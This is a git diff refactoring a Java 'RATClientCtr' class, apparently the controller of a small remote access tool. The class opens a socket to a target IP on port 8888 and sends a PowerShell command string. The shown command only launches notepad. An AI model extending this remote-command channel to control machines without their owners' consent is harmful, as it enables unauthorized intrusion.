@@ -13,16 +13,11 @@ import java.net.Socket;
  * @author gbrid
  */
 public class RATClientCtr {
-    private int port;
-    private String host;
-    private Socket mySocket;
-
-    public RATClientCtr(String h) {
-        host = h;
-        port = 8888;
-    }
+    private static final int port = 8888;
+    private static String host;
+    private static Socket mySocket;
     
-    public void openSocket() {
+    public static void openSocket(String host) {
         try {
             mySocket = new Socket(host, port);
         } catch (Exception e) {
@@ -30,7 +25,7 @@ public class RATClientCtr {
         }
     }
     
-    public String getResult() {
+    public static String getResult() {
         String res = "";
         try {
             ObjectInputStream ois = new ObjectInputStream(mySocket.getInputStream());
@@ -41,17 +36,30 @@ public class RATClientCtr {
         return res;
     }
     
-    public void closeConn() {
+    public static void closeConn() {
         try {
             mySocket.close();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
-    public void ShutDown(String command) throws IOException {
+    
+    public static void ConnectionCtr(String ip) {
+        try {
+            openSocket(ip);
+            //getResult();
+            //closeConn();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public void ShutDown() throws IOException {
+        String command = "powershell.exe start-process notepad.exe";
         OutputStream ops = mySocket.getOutputStream();
         DataOutputStream dos = new DataOutputStream(ops);
         dos.writeUTF(command);
         dos.flush();
     }
+    
 }
